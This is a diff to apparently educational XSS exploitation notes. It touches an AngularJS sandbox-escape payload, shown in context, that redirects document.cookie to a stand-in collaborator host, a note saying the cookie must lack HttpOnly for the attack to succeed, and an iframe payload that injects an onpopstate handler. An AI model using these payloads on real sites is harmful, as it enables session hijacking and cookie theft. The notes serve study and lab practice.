@@ -74,7 +74,7 @@
 {{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
 ```  
 
->Note: the cookie property must to have **HttpOnly** secure flag set.  
+>**Note:** The session cookie property must not have the **HttpOnly** secure flag set in order for XSS to succeed.  
 
 ![domxss-on-constructor.png](images/domxss-on-constructor.png)  
 
@@ -218,7 +218,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 >Host **iframe** code on exploit server and deliver exploit link to victim.  
 
 ```html
-<iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
+<iframe src="https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
 ```  
   
 ### Tags Blocked  
